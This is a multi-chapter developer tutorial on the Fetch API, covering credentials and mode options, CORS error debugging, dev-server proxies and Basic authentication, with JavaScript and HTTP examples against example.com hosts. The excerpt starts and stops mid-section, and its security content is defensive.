## Overview

curl -X POST https://api.example.com/data \
  -H "Origin: https://app.example.com" \
  -H "Content-Type: application/json" \
  -d '{"test": "data"}' \
  -v
```

**Using fetch in browser console:**

```javascript
// Test credentials
fetch('https://api.example.com/data', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ test: 'data' })
})
.then(response => {
  console.log('Headers:', [...response.headers]);
  return response.json();
})
.catch(error => console.error('CORS Error:', error));
```

---

## Credentials and Cookies

### The `credentials` Option

The `credentials` option controls whether cookies, authorization headers, and TLS client certificates are sent with cross-origin requests.

#### Available Values

**`omit`**

- Never sends credentials, even for same-origin requests
- Use when you explicitly don't want authentication information sent

```javascript
fetch('https://api.example.com/data', {
  credentials: 'omit'
});
```

**`same-origin`** (default)

- Sends credentials only for same-origin requests
- Cross-origin requests exclude cookies and auth headers
- Most secure default for preventing credential leakage

```javascript
fetch('https://api.example.com/data', {
  credentials: 'same-origin'
});
```

**`include`**

- Sends credentials with both same-origin and cross-origin requests
- Requires proper CORS headers from the server
- Essential for authenticated cross-origin requests

```javascript
fetch('https://api.example.com/data', {
  credentials: 'include'
});
```

### CORS Requirements for Credentialed Requests

When using `credentials: 'include'`, the server must explicitly allow credentialed requests through specific headers.

#### Required Server Headers

**`Access-Control-Allow-Credentials: true`**

- Must be explicitly set to `true`
- Tells the browser that the server permits credentialed requests
- Without this header, the browser rejects the response

```http
Access-Control-Allow-Credentials: true
```

**`Access-Control-Allow-Origin`**

- Cannot use wildcard (`*`) with credentialed requests
- Must specify the exact origin
- Multiple origins require dynamic generation based on request origin

```http
// Valid with credentials
Access-Control-Allow-Origin: https://example.com

// Invalid with credentials
Access-Control-Allow-Origin: *
```

**`Access-Control-Allow-Headers`**

- Cannot use wildcard (`*`) when credentials are included
- Must explicitly list allowed headers

```http
// Valid
Access-Control-Allow-Headers: Content-Type, Authorization

// Invalid with credentials
Access-Control-Allow-Headers: *
```

**`Access-Control-Allow-Methods`**

- Cannot use wildcard (`*`) with credentialed requests
- Must explicitly list allowed methods

```http
// Valid
Access-Control-Allow-Methods: GET, POST, PUT, DELETE

// Invalid with credentials
Access-Control-Allow-Methods: *
```

### Cookie Behavior with CORS

#### Same-Origin Requests

Cookies are automatically sent with same-origin requests regardless of the `credentials` option (unless explicitly set to `omit`).

```javascript
// Cookies sent automatically
fetch('/api/user');

// Same as above (default behavior)
fetch('/api/user', {
  credentials: 'same-origin'
});
```

#### Cross-Origin Requests

Cookies are only sent cross-origin when explicitly using `credentials: 'include'` and the server allows it.

```javascript
// Cookies NOT sent
fetch('https://api.example.com/user');

// Cookies sent (if server allows)
fetch('https://api.example.com/user', {
  credentials: 'include'
});
```

#### Setting Cookies Cross-Origin

For the browser to store cookies from a cross-origin response, the server must set appropriate `SameSite` attributes on cookies.

**Server Response Headers:**

```http
Set-Cookie: sessionId=abc123; SameSite=None; Secure
```

**`SameSite` Attribute Values:**

- `Strict` - Cookie only sent to same-site requests
- `Lax` - Cookie sent with top-level navigation and same-site requests (default in modern browsers)
- `None` - Cookie sent with cross-origin requests (requires `Secure` flag)

### Preflight Requests with Credentials

Cross-origin requests with credentials trigger a preflight OPTIONS request to verify server permissions.

#### Client Request Sequence

```javascript
fetch('https://api.example.com/data', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: 'value' })
});
```

#### Preflight OPTIONS Request

```http
OPTIONS /data HTTP/1.1
Host: api.example.com
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type
```

#### Required Preflight Response

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

#### Actual POST Request

Only sent if preflight succeeds:

```http
POST /data HTTP/1.1
Host: api.example.com
Origin: https://example.com
Cookie: sessionId=abc123
Content-Type: application/json
```

### Security Considerations

#### CSRF Protection

Credentialed cross-origin requests are vulnerable to CSRF attacks. Implement additional protection:

**CSRF Token Pattern:**

```javascript
// Fetch CSRF token first
const tokenResponse = await fetch('https://api.example.com/csrf-token', {
  credentials: 'include'
});
const { csrfToken } = await tokenResponse.json();

// Use token in subsequent requests
await fetch('https://api.example.com/action', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ action: 'update' })
});
```

#### Cookie Security Attributes

Always use secure cookie attributes when working with credentials:

```http
Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=None
```

- `Secure` - Cookie only sent over HTTPS
- `HttpOnly` - Cookie inaccessible to JavaScript (prevents XSS)
- `SameSite=None` - Required for cross-origin cookies (must use with `Secure`)

#### Origin Validation

Server-side origin validation is critical:

```javascript
// Server-side example (Node.js/Express)
const allowedOrigins = ['https://example.com', 'https://app.example.com'];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});
```

### Common Patterns and Best Practices

#### Authenticated API Wrapper

```javascript
class AuthenticatedAPI {
  constructor(baseURL) {
    this.baseURL = baseURL;
  }
  
  async request(endpoint, options = {}) {
    const url = `${this.baseURL}${endpoint}`;
    
    const response = await fetch(url, {
      ...options,
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        ...options.headers
      }
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return response.json();
  }
  
  get(endpoint) {
    return this.request(endpoint);
  }
  
  post(endpoint, data) {
    return this.request(endpoint, {
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
}

// Usage
const api = new AuthenticatedAPI('https://api.example.com');
const userData = await api.get('/user/profile');
```

#### Handling Credential Errors

```javascript
async function authenticatedRequest(url) {
  try {
    const response = await fetch(url, {
      credentials: 'include'
    });
    
    if (response.status === 401) {
      // Credentials invalid or expired
      console.error('Authentication required');
      // Redirect to login or refresh token
      return null;
    }
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    if (error.name === 'TypeError') {
      // CORS error or network failure
      console.error('CORS or network error:', error);
    }
    throw error;
  }
}
```

#### Token-Based Authentication Alternative

For scenarios where cookies are problematic, use token-based authentication:

```javascript
class TokenAPI {
  constructor(baseURL) {
    this.baseURL = baseURL;
    this.token = localStorage.getItem('authToken');
  }
  
  setToken(token) {
    this.token = token;
    localStorage.setItem('authToken', token);
  }
  
  async request(endpoint, options = {}) {
    const url = `${this.baseURL}${endpoint}`;
    
    const response = await fetch(url, {
      ...options,
      // No credentials needed - token in header
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${this.token}`,
        ...options.headers
      }
    });
    
    return response.json();
  }
}
```

### Browser Compatibility Notes

[Inference] Different browsers may handle credential inclusion timing differently during page load, particularly for cached resources versus dynamic requests.

The `credentials` option is supported in all modern browsers, but older implementations may have inconsistencies in preflight handling.

### Debugging Credentials and CORS

#### Common Issues

**Issue: Cookies not sent with cross-origin request**

- Check: `credentials: 'include'` is set
- Check: Server sends `Access-Control-Allow-Credentials: true`
- Check: Server sends specific origin (not `*`)
- Check: Cookie has `SameSite=None; Secure`

**Issue: Preflight request fails**

- Check: Server handles OPTIONS method
- Check: All required CORS headers present in preflight response
- Check: No wildcard headers/methods with credentialed requests

**Issue: Response rejected despite successful request**

- Check: Response headers match preflight promises
- Check: `Access-Control-Allow-Credentials` present in actual response

#### Browser DevTools

Monitor credential behavior in browser DevTools:

1. Network tab → Request headers → Check `Cookie` header presence
2. Network tab → Response headers → Verify CORS headers
3. Console → Look for CORS error messages
4. Application/Storage tab → Check cookie attributes

### Cross-Origin Credential Patterns by Scenario

#### Public API (No Authentication)

```javascript
fetch('https://api.example.com/public-data', {
  credentials: 'omit'
});
```

#### Same-Origin Authenticated Requests

```javascript
fetch('/api/user/profile', {
  credentials: 'same-origin' // or omit (default)
});
```

#### Cross-Origin Authenticated Requests

```javascript
fetch('https://api.example.com/user/profile', {
  credentials: 'include'
});
```

#### Subdomain Requests

```javascript
// From example.com to api.example.com
fetch('https://api.example.com/data', {
  credentials: 'include' // Required even for subdomains
});
```

---

## Mode Options in Fetch API

The `mode` option in the Fetch API controls how the request interacts with the browser's CORS (Cross-Origin Resource Sharing) policy and determines what kind of response you can receive.

### `cors` Mode

The default mode for cross-origin requests. Enables full CORS protocol.

**Behavior:**

- Sends CORS preflight (OPTIONS) request for non-simple requests
- Includes `Origin` header in the request
- Server must respond with appropriate CORS headers (`Access-Control-Allow-Origin`, etc.)
- If server doesn't send proper CORS headers, request fails with a network error
- Response is fully readable in JavaScript

**Use cases:**

- Accessing third-party APIs that support CORS
- Cross-origin requests where you need to read the response body
- When you need access to response headers
- Default choice for most cross-origin fetches

**Request characteristics:**

```javascript
fetch('https://api.example.com/data', {
  mode: 'cors',
  credentials: 'include', // Can send cookies cross-origin if allowed
  headers: {
    'Content-Type': 'application/json'
  }
})
```

**Server requirements:**

- Must send `Access-Control-Allow-Origin` header
- For credentialed requests: `Access-Control-Allow-Credentials: true`
- For custom headers: `Access-Control-Allow-Headers` with allowed headers
- For non-GET/POST: Preflight handling with proper `Access-Control-Allow-Methods`

**Failure scenarios:**

- Server doesn't send CORS headers → Network error
- Origin not in allowed origins → Network error
- Preflight rejected → Network error

### `no-cors` Mode

Severely restricted mode for cross-origin requests. Allows the request to proceed but limits response access.

**Behavior:**

- No preflight requests sent, even for non-simple requests
- Request proceeds regardless of server's CORS configuration
- Response is **opaque** - JavaScript cannot read body, headers, or status
- Only simple request methods allowed (GET, HEAD, POST)
- Only simple headers allowed (Accept, Accept-Language, Content-Language, Content-Type with limited values)
- `Content-Type` restricted to: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`

**Response characteristics:**

```javascript
fetch('https://third-party.com/resource', {
  mode: 'no-cors'
}).then(response => {
  console.log(response.type); // 'opaque'
  console.log(response.status); // 0
  console.log(response.ok); // false
  console.log(response.statusText); // ''
  // response.json() → Fails
  // response.text() → Returns empty string
  // response.headers.get() → Returns null
})
```

**Use cases:**

- Loading resources where you don't need to read the response (images, scripts via Service Worker)
- Making fire-and-forget requests (analytics, logging)
- Caching cross-origin resources in Service Workers
- Sending data to servers that don't support CORS but will process the request anyway

**Critical limitations:**

- Cannot determine if request succeeded or failed
- Cannot read any response data
- Cannot access response headers
- Status always appears as 0
- Response body is not accessible

**Common pitfall:**

```javascript
// This looks like it works but you can't verify success
fetch('https://api.without-cors.com/log', {
  mode: 'no-cors',
  method: 'POST',
  body: JSON.stringify({event: 'click'})
})
// You'll never know if this succeeded
```

**Service Worker caching:**

```javascript
// Valid use case in Service Worker
self.addEventListener('fetch', event => {
  if (event.request.url.includes('cdn.example.com')) {
    event.respondWith(
      caches.match(event.request).then(cached => {
        return cached || fetch(event.request, {mode: 'no-cors'})
          .then(response => {
            // Can cache opaque response
            caches.open('v1').then(cache => cache.put(event.request, response.clone()));
            return response;
          })
      })
    );
  }
});
```

### `same-origin` Mode

Strictly enforces same-origin requests only.

**Behavior:**

- Request must be to the same origin (protocol + domain + port)
- Any cross-origin request immediately fails with TypeError
- No CORS checks needed since only same-origin allowed
- Full access to response (not opaque)

**Use cases:**

- Security-sensitive operations where cross-origin requests must be prevented
- Internal APIs that should never be called cross-origin
- Preventing accidental cross-origin requests during development
- Explicit same-origin enforcement for sensitive data

**Example:**

```javascript
// Same origin: https://example.com/api/data
fetch('/api/data', {
  mode: 'same-origin'
}) // Success

// Different origin: https://api.example.com/data
fetch('https://api.example.com/data', {
  mode: 'same-origin'
}) // TypeError: Failed to fetch

// Even subdomains fail
fetch('https://sub.example.com/data', {
  mode: 'same-origin'
}) // TypeError: Failed to fetch
```

**Security benefit:**

```javascript
// Prevent CSRF-like attacks by ensuring request stays on same origin
async function deleteAccount() {
  return fetch('/api/account', {
    mode: 'same-origin', // Guarantees no cross-origin manipulation
    method: 'DELETE',
    credentials: 'same-origin'
  });
}
```

**Error handling:**

```javascript
fetch('https://different-origin.com/api', {
  mode: 'same-origin'
})
.catch(err => {
  // TypeError: Failed to fetch
  // Fails before network request is even attempted
  console.error('Cross-origin request blocked:', err);
});
```

### `navigate` Mode

[Inference] Reserved for browser navigation requests. Not typically used in application code.

**Behavior:**

- Used internally by browsers for document navigation
- Handles redirects differently than other modes
- [Unverified] May have special handling for navigation-specific security policies

**Practical note:** This mode is primarily internal to browser navigation and rarely needs to be set explicitly in fetch calls.

### Mode Comparison Table

|Feature|`cors`|`no-cors`|`same-origin`|
|---|---|---|---|
|Cross-origin allowed|Yes (with CORS)|Yes|No|
|Response readable|Yes|No (opaque)|Yes|
|Status code accessible|Yes|No (always 0)|Yes|
|Headers accessible|Yes|No|Yes|
|Preflight sent|Yes (when needed)|No|N/A|
|Server CORS required|Yes|No|N/A|
|Custom headers allowed|Yes (if preflight passes)|No|Yes|
|All HTTP methods|Yes (if preflight passes)|Only simple|Yes|

### Mode Selection Decision Tree

**Need to read the response?**

- Yes → Don't use `no-cors`
    - Cross-origin? → Use `cors` (ensure server supports CORS)
    - Same-origin? → Use `same-origin` or `cors` (default)
- No → Could use `no-cors` if cross-origin and server lacks CORS

**Security requirement to prevent cross-origin?**

- Yes → Use `same-origin`
- No → Use `cors` (default)

**Server doesn't support CORS but you just need to send data?**

- Use `no-cors` (but you cannot verify delivery)

### Common Patterns

**Graceful fallback [Inference - behavior pattern]:**

```javascript
async function fetchWithFallback(url) {
  try {
    // Try with CORS first
    const response = await fetch(url, {mode: 'cors'});
    return await response.json();
  } catch (corsError) {
    // If CORS fails and we don't need response, fall back
    await fetch(url, {mode: 'no-cors'});
    // Note: We can't verify this succeeded
    throw new Error('CORS failed, sent no-cors request');
  }
}
```

**Strict same-origin for sensitive operations:**

```javascript
async function updatePassword(newPassword) {
  return fetch('/api/password', {
    mode: 'same-origin',
    method: 'PUT',
    credentials: 'same-origin',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({password: newPassword})
  });
}
```

**Cross-origin API with CORS:**

```javascript
async function fetchUserData(userId) {
  const response = await fetch(`https://api.example.com/users/${userId}`, {
    mode: 'cors',
    credentials: 'include', // Send cookies if needed
    headers: {
      'Authorization': 'Bearer ' + token
    }
  });
  
  if (!response.ok) {
    throw new Error(`HTTP ${response.status}`);
  }
  
  return response.json();
}
```

### Mode Interaction with Other Options

**With `credentials`:**

- `cors` + `credentials: 'include'` → Sends cookies cross-origin (server must allow)
- `no-cors` + `credentials: 'include'` → Sends cookies but response still opaque
- `same-origin` + `credentials: 'omit'` → Compatible, no cookies sent

**With `redirect`:**

- `cors` → Follows redirects, applies CORS to each hop
- `no-cors` → Follows redirects, all responses opaque
- `same-origin` → [Inference] Redirects to different origin would likely fail

**With custom headers:**

- `cors` → Requires preflight if non-simple headers
- `no-cors` → Only simple headers allowed, custom headers stripped
- `same-origin` → All headers allowed

### Browser Compatibility and Defaults

**Default behavior:**

- Same-origin requests: `mode` defaults to `cors` but behaves like `same-origin` (no CORS needed)
- Cross-origin requests: `mode` defaults to `cors`

**Explicit setting recommended for:**

- Security-critical same-origin-only requests → Set `same-origin`
- Fire-and-forget cross-origin → Set `no-cors` (if appropriate)
- Standard cross-origin API calls → Explicitly set `cors` for clarity

---

## CORS Error Debugging

### Understanding CORS Error Messages

CORS errors manifest differently across browsers, but common patterns include:

```
Access to fetch at 'https://api.example.com' from origin 'https://myapp.com' 
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is 
present on the requested resource.
```

```
Access to fetch at 'https://api.example.com' from origin 'https://myapp.com' 
has been blocked by CORS policy: Response to preflight request doesn't pass 
access control check: No 'Access-Control-Allow-Origin' header is present.
```

The browser console provides the most detailed CORS error information. Network tab inspections alone may miss critical details since CORS failures occur at the browser security layer before response data is fully accessible.

### Preflight Request Failures

Preflight requests (OPTIONS) fail when:

**Missing or incorrect `Access-Control-Allow-Methods`**

```javascript
// Request uses POST
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ data: 'value' })
});

// Server must respond to OPTIONS with:
// Access-Control-Allow-Methods: POST
```

**Missing `Access-Control-Allow-Headers` for custom headers**

```javascript
// Request includes custom header
fetch('https://api.example.com/data', {
  headers: { 
    'X-Custom-Header': 'value',
    'Authorization': 'Bearer token'
  }
});

// Server OPTIONS response needs:
// Access-Control-Allow-Headers: X-Custom-Header, Authorization
```

**Incorrect `Access-Control-Max-Age` causing excessive preflights**

```
Access-Control-Max-Age: 86400
```

Low or missing values cause repeated preflight requests, impacting performance. [Inference] Setting this too high may prevent immediate recognition of server CORS configuration changes.

### Credentials and Authentication Issues

**Credentials mode with wildcard origin**

```javascript
// This configuration will fail
fetch('https://api.example.com/data', {
  credentials: 'include'
});

// If server responds with:
// Access-Control-Allow-Origin: *
// Access-Control-Allow-Credentials: true
// Error: Wildcard not allowed with credentials
```

**Solution requires explicit origin:**

```
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Credentials: true
```

**Missing credentials in request**

```javascript
// Cookies won't be sent without this
fetch('https://api.example.com/data', {
  credentials: 'include'  // or 'same-origin'
});
```

### Response Header Exposure

**Accessing headers that aren't exposed**

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    // This may return null if header not exposed
    const customHeader = response.headers.get('X-Custom-Header');
    const rateLimit = response.headers.get('X-RateLimit-Remaining');
  });
```

**Server must explicitly expose custom headers:**

```
Access-Control-Expose-Headers: X-Custom-Header, X-RateLimit-Remaining
```

Simple headers accessible by default: `Cache-Control`, `Content-Language`, `Content-Type`, `Expires`, `Last-Modified`, `Pragma`.

### HTTP vs HTTPS Origin Mismatches

Mixed content requests fail with CORS-like errors:

```javascript
// On https://myapp.com
fetch('http://api.example.com/data')
// Blocked: Mixed Content
```

This appears similar to CORS errors but is actually a mixed content policy violation. HTTPS pages cannot make requests to HTTP endpoints.

### Port Number Considerations

Origins with different ports are treated as separate origins:

```
https://myapp.com:3000 ≠ https://myapp.com:8080
http://localhost:3000 ≠ http://localhost:8080
```

Each requires separate `Access-Control-Allow-Origin` configuration or use of origin echo patterns on the server.

### Debugging Non-Standard Request Methods

```javascript
fetch('https://api.example.com/data', {
  method: 'PATCH'  // or DELETE, PUT, etc.
});
```

Non-simple methods (anything except GET, HEAD, POST with simple content types) trigger preflight. Verify:

- Server handles OPTIONS requests
- `Access-Control-Allow-Methods` includes the method
- Method is correctly implemented on the server

### Content-Type Header Preflight Triggers

These content types do NOT trigger preflight:

- `application/x-www-form-urlencoded`
- `multipart/form-data`
- `text/plain`

These DO trigger preflight:

```javascript
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },  // Triggers preflight
  body: JSON.stringify({ data: 'value' })
});
```

### Network Tab Investigation

**What to check in browser DevTools Network tab:**

1. **Presence of OPTIONS request** - Should appear before actual request for non-simple requests
2. **OPTIONS request status** - Should return 200 or 204
3. **Response headers on OPTIONS:**
    - `Access-Control-Allow-Origin`
    - `Access-Control-Allow-Methods`
    - `Access-Control-Allow-Headers`
    - `Access-Control-Max-Age`
4. **Actual request status** - May fail even if preflight succeeds
5. **Response headers on actual request:**
    - `Access-Control-Allow-Origin` (required on all responses)
    - `Access-Control-Allow-Credentials` (if using credentials)

### Server Response Status Codes

**Preflight (OPTIONS) acceptable status codes:**

- 200 OK (most common)
- 204 No Content (preferred by some, no response body)

**Status codes that cause CORS failures:**

- 4xx or 5xx on OPTIONS request
- OPTIONS returns 200 but missing required CORS headers
- Actual request returns correct headers but inappropriate status (e.g., 401 without proper CORS headers)

### Common False Positives

**Server error appearing as CORS error:**

```javascript
// Server throws 500 error without CORS headers
fetch('https://api.example.com/data')
// Browser shows CORS error, but real issue is server crash
```

Check server logs to distinguish actual server errors from CORS configuration issues.

**Authentication failures masquerading as CORS:**

```javascript
// 401 Unauthorized without proper CORS headers
// Shows as CORS error in console
```

Ensure authentication endpoints return CORS headers even on failure responses.

### Localhost Development Complications

**Different localhost interpretations:**

```
http://localhost:3000 ≠ http://127.0.0.1:3000
```

Some browsers or systems treat these as different origins. [Inference] This is likely due to DNS resolution differences and origin comparison at the string level.

**File protocol limitations:**

```javascript
// Opening HTML file directly (file:///)
fetch('https://api.example.com/data')
// Often blocked due to null origin
```

File protocol has special origin handling. Use local development server instead.

### Third-Party Cookie Blocking

Modern browsers block third-party cookies by default:

```javascript
fetch('https://api.example.com/data', {
  credentials: 'include'
});
```

Even with correct CORS headers, cookies may not be sent/received due to browser privacy settings. Safari is particularly strict with third-party cookies.

[Inference] This affects cross-origin authenticated requests even when CORS is correctly configured, as the browser may prevent cookie transmission at a different security layer.

### Proxy-Based Debugging Workarounds

Development proxies can mask CORS issues:

```javascript
// In development, proxy configuration in package.json, webpack, or vite.config
// may hide CORS problems that appear in production
{
  "proxy": "https://api.example.com"
}
```

[Inference] Testing against actual cross-origin endpoints during development helps identify CORS issues earlier.

### Request Header Case Sensitivity

Header names are case-insensitive in HTTP, but some server frameworks may handle them case-sensitively:

```javascript
fetch('https://api.example.com/data', {
  headers: { 'content-type': 'application/json' }
});
```

Standard practice uses canonical forms: `Content-Type`, `Authorization`, etc.

### Debugging Strategies

**Systematic isolation:**

1. Test with simple GET request first (no preflight)
2. Add `Content-Type: application/json` (triggers preflight)
3. Add custom headers one at a time
4. Add credentials mode
5. Test other HTTP methods

**Browser comparison:** Different browsers may show different error messages for the same CORS failure. Testing in multiple browsers can provide additional diagnostic information.

**cURL bypass test:**

```bash
curl -X OPTIONS https://api.example.com/data \
  -H "Origin: https://myapp.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  -v
```

This bypasses browser CORS enforcement to see raw server responses.

**Browser extensions:** CORS browser extensions that inject headers should be disabled during debugging, as they mask real issues. [Unverified] Some extensions may not inject headers consistently across all request types.

### Timing and Race Conditions

**Preflight caching issues:**

```javascript
// First request succeeds, subsequent fail
fetch('https://api.example.com/data', { method: 'POST' });
```

[Inference] This pattern suggests server configuration changed between requests, or preflight cache (`Access-Control-Max-Age`) expired between tests.

**Server restarts during debugging:** Preflight cache may hold stale configuration even after server CORS settings are updated. Clear browser cache or wait for `Access-Control-Max-Age` duration to expire.

### Multiple Redirect Complications

```javascript
fetch('https://api.example.com/redirect-to-final')
// If redirect doesn't preserve CORS headers, fails
```

Each redirect response must include appropriate CORS headers. The browser performs CORS checks at each redirect step.

### Framework-Specific Debugging

Different server frameworks handle OPTIONS requests differently. Some automatically respond to OPTIONS, others require explicit route handlers.

[Inference] Missing explicit OPTIONS route handlers is a common issue in Express.js, Flask, and similar frameworks when developers only define POST/GET routes.

### Response Body Access After CORS Failure

```javascript
fetch('https://api.example.com/data')
  .then(response => response.json())
  .catch(error => {
    // error.message shows CORS error
    // Cannot access response body due to CORS failure
  });
```

CORS failures prevent access to response content entirely. The error object will not contain server-returned error messages or response bodies.

### Wildcard Subdomain Patterns

```
Access-Control-Allow-Origin: https://*.example.com
```

This is NOT valid CORS syntax. CORS headers must specify exact origins or use `*`. Multiple origins require server-side logic to echo appropriate origin:

```
// Server checks request Origin header
// Responds with matching origin if in allowlist
Access-Control-Allow-Origin: https://app1.example.com
```

### SameSite Cookie Attribute Interactions

```javascript
// Cookie set with SameSite=Strict or SameSite=Lax
fetch('https://api.example.com/data', {
  credentials: 'include'
});
```

`SameSite` cookie attributes interact with CORS and credentials mode. `SameSite=Strict` cookies are never sent in cross-origin requests, regardless of CORS configuration. `SameSite=Lax` allows some cross-origin GET requests but blocks others.

[Inference] CORS header configuration alone is insufficient for authenticated cross-origin requests when strict `SameSite` policies are applied.

---

## Fetch API: Proxy Patterns for Development

### Local Development Server Proxies

#### Webpack DevServer Proxy

Configure proxy rules in `webpack.config.js` to redirect API requests during development:

```javascript
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'http://localhost:3000',
        pathRewrite: {'^/api': ''},
        changeOrigin: true,
        secure: false
      }
    }
  }
};
```

Key configuration options:

- `target`: Backend server URL
- `pathRewrite`: Transform request paths before forwarding
- `changeOrigin`: Modifies the origin header to match target
- `secure`: Set to false for self-signed certificates
- `bypass`: Function to conditionally skip proxy based on request

#### Vite Proxy Configuration

Vite provides similar proxy capabilities with cleaner syntax:

```javascript
export default {
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:8080',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api/, '')
      },
      '/ws
```

---

# Authentication

## Basic Authentication

### Setting Up Basic Authentication Headers

Basic authentication requires encoding credentials in Base64 format and including them in the Authorization header. The format follows the pattern `Basic base64(username:password)`.

```javascript
const username = 'user';
const password = 'pass123';
const credentials = btoa(`${username}:${password}`);

fetch('https://api.example.com/data', {
  method: 'GET',
  headers: {
    'Authorization': `Basic ${credentials}`
  }
})
.then(response => response.json())
.then(data => console.log(data));
```

### Using the Headers Object

The Headers interface provides a structured way to manage HTTP headers, including authentication credentials.

```javascript
const headers = new Headers();
headers.append('Authorization', `Basic ${btoa('user:pass123')}`);
headers.append('Content-Type', 'application/json');

fetch('https://api.example.com/resource', {
  method: 'POST',
  headers: headers,
  body: JSON.stringify({ data: 'value' })
})
.then(response => response.json());
```

### Handling Authentication with Different HTTP Methods

#### GET Requests

```javascript
const auth = btoa('username:password');

fetch('https://api.example.com/users', {
  headers: {
    'Authorization': `Basic ${auth}`
  }
})
.then(response => {
  if (response.status === 401) {
    throw new Error('Authentication failed');
  }
  return response.json();
});
```

#### POST Requests

```javascript
fetch('https://api.example.com/users', {
  method: 'POST',
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    name: 'John Doe',
    email: 'john@example.com'
  })
});
```

#### PUT Requests

```javascript
fetch('https://api.example.com/users/123', {
  method: 'PUT',
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    name: 'Jane Doe'
  })
});
```

#### DELETE Requests

```javascript
fetch('https://api.example.com/users/123', {
  method: 'DELETE',
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`
  }
});
```

### Credential Management and Storage

#### Storing Credentials Securely

```javascript
// Store in memory only - not in localStorage
class AuthManager {
  constructor() {
    this.credentials = null;
  }
  
  setCredentials(username, password) {
    this.credentials = btoa(`${username}:${password}`);
  }
  
  getAuthHeader() {
    return this.credentials ? `Basic ${this.credentials}` : null;
  }
  
  clearCredentials() {
    this.credentials = null;
  }
}

const authManager = new AuthManager();
authManager.setCredentials('user', 'pass');

fetch('https://api.example.com/data', {
  headers: {
    'Authorization': authManager.getAuthHeader()
  }
});
```

#### Reusable Fetch Wrapper

```javascript
function authenticatedFetch(url, options = {}) {
  const username = 'user';
  const password = 'pass';
  const auth = btoa(`${username}:${password}`);
  
  const defaultOptions = {
    headers: {
      'Authorization': `Basic ${auth}`,
      ...options.headers
    }
  };
  
  return fetch(url, { ...options, ...defaultOptions });
}

// Usage
authenticatedFetch('https://api.example.com/data')
  .then(response => response.json())
  .then(data => console.log(data));
```

### Response Status Handling

#### Authentication Status Codes

```javascript
fetch('https://api.example.com/protected', {
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`
  }
})
.then(response => {
  switch(response.status) {
    case 200:
      return response.json();
    case 401:
      throw new Error('Invalid credentials');
    case 403:
      throw new Error('Access forbidden');
    default:
      throw new Error(`Unexpected status: ${response.status}`);
  }
})
.then(data => console.log(data))
.catch(error => console.error(error));
```

#### Checking Authentication Header in Response

```javascript
fetch('https://api.example.com/resource', {
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`
  }
})
.then(response => {
  const authRequired = response.headers.get('WWW-Authenticate');
  
  if (response.status === 401 && authRequired) {
    console.log('Server requires authentication:', authRequired);
  }
  
  return response.json();
});
```

### CORS and Credentials

#### Including Credentials in Cross-Origin Requests

```javascript
fetch('https://api.example.com/data', {
  method: 'GET',
  credentials: 'include', // sends cookies and auth headers
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`
  }
})
.then(response => response.json());
```

#### Credentials Mode Options

```javascript
// 'omit' - never send credentials
fetch(url, { credentials: 'omit' });

// 'same-origin' - only send credentials for same-origin requests
fetch(url, { credentials: 'same-origin' });

// 'include' - always send credentials
fetch(url, { credentials: 'include' });
```

### Error Handling Patterns

#### Comprehensive Error Handling

```javascript
async function fetchWithBasicAuth(url, username, password) {
  try {
    const response = await fetch(url, {
      headers: {
        'Authorization': `Basic ${btoa(`${username}:${password}`)}`
      }
    });
    
    if (!response.ok) {
      if (response.status === 401) {
        throw new Error('Authentication failed: Invalid credentials');
      }
      if (response.status === 403) {
        throw new Error('Access denied: Insufficient permissions');
      }
      throw new Error(`HTTP error: ${response.status}`);
    }
    
    return await response.json();
    
  } catch (error) {
    if (error instanceof TypeError) {
      throw new Error('Network error: Check connection');
    }
    throw error;
  }
}
```

#### Retry Logic for Failed Authentication

```javascript
async function fetchWithRetry(url, credentials, maxRetries = 3) {
  let lastError;
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, {
        headers: {
          'Authorization': `Basic ${credentials}`
        }
      });
      
      if (response.status === 401) {
        throw new Error('Invalid credentials');
      }
      
      if (response.ok) {
        return await response.json();
      }
      
    } catch (error) {
      lastError = error;
      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
    }
  }
  
  throw lastError;
}
```

### Advanced Patterns

#### Pre-flight Request Handling

```javascript
// For methods that trigger pre-flight (PUT, DELETE, custom headers)
